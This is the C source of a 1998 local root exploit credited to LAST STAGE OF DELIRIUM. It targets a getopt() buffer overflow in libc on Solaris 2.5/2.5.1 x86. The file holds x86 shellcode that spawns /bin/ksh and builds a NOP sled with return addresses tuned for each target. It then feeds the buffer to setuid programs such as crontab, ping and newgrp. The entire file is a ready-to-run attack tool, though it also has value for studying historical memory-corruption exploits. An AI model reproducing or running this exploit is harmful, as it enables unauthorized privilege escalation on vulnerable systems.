/*## copyright LAST STAGE OF DELIRIUM apr 1998 poland        *://lsd-pl.net/ #*/
/*## libc.so getopt()                                                        #*/

unsigned int ADRNUM[5]={  3000,  3000,  3000,   100,  1000};
unsigned int NOPNUM[5]={  6000,  6000,  6000,  8070,  8000};
unsigned int PCHNUM[5]={     0,     0,     0,     0,     0};
unsigned int ALLIGN[5]={     0,     0,     0,     0,     2};
unsigned int ADROFS[5]={  6500,  6500,  7000,  7000,  4500};
unsigned int PCHOFS[5]={     0,     0,     0,     0,     0};
unsigned char *SBUF[5]={ "ANS", "ANS", "ANS", "NSA","NSLA"};

char shellcode[]=
    "\xeb\x1b"             /* jmp     <shellcode+30>       */
    "\x33\xd2"             /* xorl    %edx,%edx            */
    "\x58"                 /* popl    %eax                 */
    "\x8d\x78\x14"         /* leal    0x14(%eax),edi       */
    "\x52"                 /* pushl   %edx                 */
    "\x57"                 /* pushl   %edi                 */
    "\x50"                 /* pushl   %eax                 */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x92"                 /* xchgl   %eax,%edx            */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x88\x42\x08"         /* movb    %al,0x8(%edx)        */
    "\x83\xef\x3c"         /* subl    $0x3c,%edi           */
    "\xb0\x9a"             /* movb    $0x9a,%al            */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x47"                 /* incl    %edi                 */
    "\xb0\x07"             /* movb    $0x7,%al             */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\xb0\x3b"             /* movb    $0x3b,%al            */
    "\xe8\xe0\xff\xff\xff" /* call    <shellcode+2>        */
    "/bin/ksh"
;

char jump[]=
    "\x8b\xc4"             /* movl    %esp,%eax            */
    "\xc3"                 /* ret                          */
;

main(int argc,char **argv){
    char bufor[10000],adr[4],pch[4],*b,*o; 
    int i,n=-1;

    printf("copyright LAST STAGE OF DELIRIUM apr 1998 poland  //lsd-pl.net/\n");
    printf("libc.so getopt() for solaris 2.5 2.5.1 x86\n\n");

    if(argc==1){
        printf("usage: %s {allocate|deallocate|crontab|ping|newgrp}\n",argv[0]);
        exit(-1);
    }
    if(!strcmp(argv[1],"allocate")) n=0;
    if(!strcmp(argv[1],"deallocate")) n=1;
    if(!strcmp(argv[1],"crontab")) n=2;
    if(!strcmp(argv[1],"ping")) n=3;
    if(!strcmp(argv[1],"newgrp")) n=4;
    if(n==-1) exit(-1);

    b=bufor;
    o=SBUF[n];
    while(*o!=0){
        switch(*o++){
        case 'N':
            for(i=0;i<NOPNUM[n];i++) *b++=0x90; 
            break;
        case 'A':
            *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+ADROFS[n];
            for(i=0;i<ADRNUM[n];i++) *b++=adr[i%4]; 
            break;
        case 'P':
            *((unsigned long*)pch)=(*(unsigned long(*)())jump)()+PCHOFS[n];
            for(i=0;i<PCHNUM[n];i++) *b++=pch[i%4]; 
            break;
        case 'L':
            for(i=0;i<ALLIGN[n];i++) *b++=0x33; 
            break;
        case 'S':
            for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
        }
    }
    switch(n){
    case 0: execl("/usr/sbin/allocate","allocate","-U",bufor,bufor,0);
    case 1: execl("/usr/sbin/deallocate","deallocate","-U",bufor,bufor,0);
    case 2: execl("/usr/bin/crontab","crontab","-e",bufor,0);
    case 3: execl("/usr/sbin/ping","ping","-i",bufor,0);
    case 4: execl("/usr/bin/newgrp","newgrp","-l",bufor,0);
    }
}

